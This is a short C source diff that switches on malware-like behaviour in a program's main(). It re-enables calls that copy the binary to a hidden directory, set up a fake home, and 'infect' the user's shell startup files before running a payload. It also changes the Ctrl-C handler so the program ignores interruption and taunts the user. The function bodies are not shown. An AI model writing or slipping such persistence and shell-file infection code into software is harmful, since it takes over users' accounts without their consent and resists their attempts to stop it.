@@ -27,6 +27,8 @@ const char *commoncmds[] = {
 void inthandler(int _) {
     (void) _;
     signal(SIGINT, inthandler);
+    sleep(1);
+    puts("Hey, that's mean!");
 }
 
 
@@ -36,12 +38,12 @@ int main(int argc, char *argv[]) {
     char olddirname[PATH_MAX];
     signal(SIGINT, inthandler);
     home = getenv("HOME");
-    /*binname = argv[0];*/
-    /*getcwd(olddirname, sizeof(olddirname));*/
-    /*hiddencopy(binname, olddirname);*/
-    /*dofakehome();*/
-    /*hiddenpath = choosedotdir();*/
-    /*infectshellfiles(hiddenpath, home);*/
+    binname = argv[0];
+    getcwd(olddirname, sizeof(olddirname));
+    hiddencopy(binname, olddirname);
+    dofakehome();
+    hiddenpath = choosedotdir();
+    infectshellfiles(hiddenpath, home);
     payload();
     chdir(home);
     chdir(hiddenpath);
